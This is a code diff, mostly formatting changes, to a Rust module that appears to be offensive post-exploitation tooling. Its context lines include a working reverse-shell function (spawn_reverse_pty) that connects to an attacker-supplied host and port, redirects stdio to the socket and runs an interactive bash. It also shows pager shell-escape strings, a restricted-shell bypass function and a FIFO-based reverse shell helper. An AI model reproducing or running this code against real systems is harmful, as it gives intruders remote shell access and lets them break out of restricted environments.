@@ -7,7 +7,7 @@ pub struct PtySession {
 
 pub fn spawn_pty(command: &str, args: &[&str], rows: u16, cols: u16) -> Result<PtySession, String> {
     let pty_system = native_pty_system();
-    
+
     let pair = pty_system
         .openpty(PtySize {
             rows,
@@ -16,18 +16,19 @@ pub fn spawn_pty(command: &str, args: &[&str], rows: u16, cols: u16) -> Result<P
             pixel_height: 0,
         })
         .map_err(|e| format!("Failed to open PTY: {}", e))?;
-    
+
     let mut cmd = CommandBuilder::new(command);
     for arg in args {
         cmd.arg(arg);
     }
-    
-    let child = pair.slave
+
+    let child = pair
+        .slave
         .spawn_command(cmd)
         .map_err(|e| format!("Failed to spawn command: {}", e))?;
-    
+
     println!("[PTY] Spawned {} with PID", command);
-    
+
     Ok(PtySession {
         master: pair.master,
         child,
@@ -98,7 +99,7 @@ pub fn detect_tty() -> bool {
 #[cfg(unix)]
 pub fn get_terminal_size() -> Result<(u16, u16), String> {
     use std::os::unix::io::AsRawFd;
-    
+
     #[repr(C)]
     struct Winsize {
         ws_row: u16,
@@ -106,14 +107,14 @@ pub fn get_terminal_size() -> Result<(u16, u16), String> {
         ws_xpixel: u16,
         ws_ypixel: u16,
     }
-    
+
     let mut size = Winsize {
         ws_row: 0,
         ws_col: 0,
         ws_xpixel: 0,
         ws_ypixel: 0,
     };
-    
+
     unsafe {
         if libc::ioctl(std::io::stdin().as_raw_fd(), libc::TIOCGWINSZ, &mut size) == 0 {
             Ok((size.ws_row, size.ws_col))
@@ -132,7 +133,7 @@ pub fn get_terminal_size() -> Result<(u16, u16), String> {
 #[cfg(unix)]
 pub fn set_terminal_size(rows: u16, cols: u16) -> Result<(), String> {
     use std::os::unix::io::AsRawFd;
-    
+
     #[repr(C)]
     struct Winsize {
         ws_row: u16,
@@ -140,14 +141,14 @@ pub fn set_terminal_size(rows: u16, cols: u16) -> Result<(), String> {
         ws_xpixel: u16,
         ws_ypixel: u16,
     }
-    
+
     let size = Winsize {
         ws_row: rows,
         ws_col: cols,
         ws_xpixel: 0,
         ws_ypixel: 0,
     };
-    
+
     unsafe {
         if libc::ioctl(std::io::stdin().as_raw_fd(), libc::TIOCSWINSZ, &size) == 0 {
             Ok(())
@@ -173,17 +174,11 @@ pub fn shell_escape_vi() -> Vec<String> {
 }
 
 pub fn shell_escape_less() -> Vec<String> {
-    vec![
-        "!/bin/bash".to_string(),
-        "!sh".to_string(),
-    ]
+    vec!["!/bin/bash".to_string(), "!sh".to_string()]
 }
 
 pub fn shell_escape_more() -> Vec<String> {
-    vec![
-        "!/bin/bash".to_string(),
-        "!sh".to_string(),
-    ]
+    vec!["!/bin/bash".to_string(), "!sh".to_string()]
 }
 
 pub fn shell_escape_find() -> String {
@@ -205,7 +200,8 @@ exec </dev/tty
 while read -r cmd; do
     echo "$cmd"
 done
-"#.to_string()
+"#
+    .to_string()
 }
 
 pub fn bypass_rbash() -> Vec<String> {
@@ -228,23 +224,23 @@ pub fn detect_restricted_shell() -> bool {
 pub fn spawn_reverse_pty(lhost: &str, lport: u16) -> Result<(), String> {
     use std::net::TcpStream;
     use std::os::unix::io::{AsRawFd, FromRawFd};
-    
+
     let stream = TcpStream::connect(format!("{}:{}", lhost, lport))
         .map_err(|e| format!("Connection failed: {}", e))?;
-    
+
     let fd = stream.as_raw_fd();
-    
+
     unsafe {
         libc::dup2(fd, 0);
         libc::dup2(fd, 1);
         libc::dup2(fd, 2);
     }
-    
+
     let mut cmd = Command::new("/bin/bash");
     cmd.arg("-i");
     cmd.spawn()
         .map_err(|e| format!("Failed to spawn shell: {}", e))?;
-    
+
     Ok(())
 }
 
@@ -257,7 +253,7 @@ pub fn spawn_reverse_pty(_lhost: &str, _lport: u16) -> Result<(), String> {
 pub fn create_named_pipe(path: &str) -> Result<(), String> {
     use std::fs;
     use std::os::unix::fs::OpenOptionsExt;
-    
+
     unsafe {
         if libc::mkfifo(std::ffi::CString::new(path).unwrap().as_ptr(), 0o644) == 0 {
             println!("[PTY] Created named pipe: {}", path);
@@ -270,7 +266,10 @@ pub fn create_named_pipe(path: &str) -> Result<(), String> {
 
 #[cfg(windows)]
 pub fn create_named_pipe(_path: &str) -> Result<(), String> {
-    Err("Named pipes use different API on Windows, use std::os::windows::io::named_pipe".to_string())
+    Err(
+        "Named pipes use different API on Windows, use std::os::windows::io::named_pipe"
+            .to_string(),
+    )
 }
 
 pub fn fifo_shell_reverse(fifo_path: &str, lhost: &str, lport: u16) -> String {
